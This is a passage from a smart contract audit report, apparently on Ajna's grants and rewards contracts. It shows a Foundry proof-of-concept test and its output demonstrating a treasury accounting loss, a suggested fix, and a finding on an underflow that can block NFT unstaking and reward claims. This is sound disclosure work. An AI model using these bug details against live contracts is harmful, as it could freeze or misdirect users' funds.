class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// only put 90% back to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fundTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 10% + (90%&amp;remaining) = initial treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">500_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be equal to the initial treasury&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The function put 10% back in, while in the actual all 100% has been spent. Loss 10%.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startNewDistributionPeriod</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Treasury at the new period (got updated)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">498_500_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be initial-10%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;treasury actual balance&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The same GBC evidenced that treasury = 500_000_000 * 1e18 at the time it was calculated,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// But the actual balance is 500_000_000 * 1e18 - 10% = 498_500_000 * 1e18.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , , </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newGbc</span><span class=\"mtk1\">, , ) = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDistributionPeriodInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">oldTreasury</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the same GBC as previous period&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newGbc</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the same GBC as previous period&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"shell\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">run: forge test --match-test testPoCTreasuryPrecisionLoss -vv</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/unit/StandardFunding.t.sol:StandardFundingGrantFundTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testPoCTreasuryPrecisionLoss() (gas: 3451937)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Treasury initial amount: 500000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Treasury after start, deduct 3%: 485000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  GBC: 15000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  totalTokensRequested: 13500000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Total claimed rewards: 1500000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Treasury at the end of the period (should be the same as started): 485000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Treasury at the new period (got updated): 485000000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  treasury actual balance: 498500000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 1.20s</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If it is safe to assume that all periods will always have 10% for delegation rewards, the contract should calculate only 90% of <code>fundsAvailable</code> when updating the treasury.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: ajna-grants/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">197:    function _updateTreasury(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">198:        uint24 distributionId_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">199:    ) private {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">200:        bytes32 fundedSlateHash = _distributions[distributionId_].fundedSlateHash;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">201:        uint256 fundsAvailable  = _distributions[distributionId_].fundsAvailable;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">216:        // readd non distributed tokens to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+217:        treasury += ((fundsAvailable * 9/10) - totalTokensRequested);      </span></span></span></code></pre>\n<h3 id=\"remark\" style=\"position:relative;\"><a href=\"#remark\" aria-label=\"remark permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Remark</h3>\n<p>The <code>claimDelegateReward()</code> function uses <code>Maths.wmul()</code>, which automatically rounds the multiplication result up or down. For example, <code>Maths.wmul(1, 0.5 * 1e18) = 1</code> (rounding up) while <code>Maths.wmul(1, 0.49 * 1e18) = 0</code> (rounding down). As a result, <code>rewardClaimed_</code> can lose precision for small decimal amounts and token holders typically have small fractions of tokens down to <code>1 wei</code>. It is uncertain, but the total actual paid rewards could be more than 10% if rounded up, resulting in an insignificant loss of precision in the treasury. However, if <code>rewardClaimed_</code> is deducted from <code>fundsAvailable</code>, it could lead to an integer underflow revert if <code>fundsAvailable - totalClaimed - totalTokensRequested = 100% - 10.xx% - 90%</code>, which exceeds 100%.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/450#issuecomment-1568861837\">Picodes (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/263#issuecomment-1555119925\">MikeHathaway (Ajna) confirmed via duplicate issue <code>#263</code></a></strong></p>\n<hr>\n<h2 id=\"h-05-incorrect-calculation-of-the-remaining-updatedrewards-leads-to-possible-underflow-error\" style=\"position:relative;\"><a href=\"#h-05-incorrect-calculation-of-the-remaining-updatedrewards-leads-to-possible-underflow-error\" aria-label=\"h 05 incorrect calculation of the remaining updatedrewards leads to possible underflow error permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440\">[H-05] Incorrect calculation of the remaining <code>updatedRewards</code> leads to possible underflow error</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/440\">Haipls</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/354\">Koolex</a> and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/192\">Vagner</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L549\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L549</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L725\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L725</a></p>\n<p><code>RewardsManage.sol</code> keeps track of the <strong>total number of rewards collected per epoch</strong> for all pools:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"c\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">05</span><span class=\"mtk1\">-ajna\\ajna-core\\src\\RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev `epoch =&gt; rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(uint256 =&gt; </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) public override rewardsClaimed;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">75</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">/// @dev `epoch =&gt; update bucket rate rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">76</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(uint256 =&gt; </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) public override updateRewardsClaimed;</span></span></span></code></pre>\n<p>And the <code>rewardsCap</code> calculation when calculating the reward applies only to the pool, which leads to a situation when the condition is fulfilled <code>rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap</code>, <strong>But <code>rewardsCap</code> is less than <code>rewardsClaimedInEpoch</code></strong>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-546:         if (rewardsClaimedInEpoch_ + newRewards_ &gt; rewardsCapped) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">548:             // set claim reward to difference between cap and reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit rewardsCapped can be less then  rewardsClaimedInEpoch_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">550:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">719:         uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned); // @audit in one pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-720:        uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">722:         // update total tokens claimed for updating bucket exchange rates tracker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">723:         if (rewardsClaimedInEpoch + updatedRewards_ &gt;= rewardsCap) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">724:              // if update reward is greater than cap, set to remaining difference</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-725:             updatedRewards_ = rewardsCap - rewardsClaimedInEpoch; // @audit rewardsCap can be less then rewardsClaimedInEpoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">726:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">728:         // accumulate the full amount of additional rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-729:        updateRewardsClaimed[curBurnEpoch] += updatedRewards_; // @audit increase per epoch</span></span></span></code></pre>\n<p>Which causes an <code>underflow</code> erorr in the result <code>updatedRewards_ = rewardsCap - rewardsClaimedInEpoch</code> where <code>rewardsCap &#x3C; rewardsClaimedInEpoch</code>, this error <strong>leads to a transaction fail</strong>, which will further temporarily/permanently block actions with NFT as <code>unstake/claimRewards</code> for pools in which <code>rewardsCap</code> will fail less than the total <code>rewardsClaimedInEpoch</code>.</p>\n<p>We have 2 instances of this problem::</p>\n<ol>\n<li>during the call <code>_calculateNewRewards</code></li>\n<li>during the call <code>_updateBucketExchangeRates</code></li>\n</ol>\n<p>A failure in any of these will result in users of certain pools being unable to withdraw their NFTs as well as the reward.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s take a closer look at the problem and why this is possible:</p>\n<ol>\n<li>We have a general calculation of rewards taken per epoch:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @dev `epoch =&gt; rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsClaimed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @dev `epoch =&gt; update bucket rate rewards claimed` mapping.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">74</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updateRewardsClaimed</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ol start=\"2\">\n<li>The state is updated for the epoch by the amount calculated for each pool:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_calculateAndClaimRewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">lastClaimedEpoch</span><span class=\"mtk1\">; </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">epochToClaim_</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">410</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// update epoch token claim trackers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">411</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">rewardsClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">]           += </span><span class=\"mtk12\">nextEpochRewards</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">413</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_updateBucketExchangeRates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">curBurnEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_</span><span class=\"mtk1\">).</span><span class=\"mtk11\">currentBurnEpoch</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">728</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">// accumulate the full amount of additional rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">729</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">updateRewardsClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">curBurnEpoch</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">updatedRewards_</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ol start=\"3\">\n<li>At the time of calculation of the reward for the update:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">526:         (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">527:             ,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">528:             // total interest accumulated by the pool over the claim period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+529:             uint256 totalBurnedInPeriod,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">530:             // total tokens burned over the claim period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">531:             uint256 totalInterestEarnedInPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">532:         ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">533:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">534:         // calculate rewards earned</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">542:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">544:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">546:         if (rewardsClaimedInEpoch_ + newRewards_ &gt; rewardsCapped) {</span></span></span>\n<span 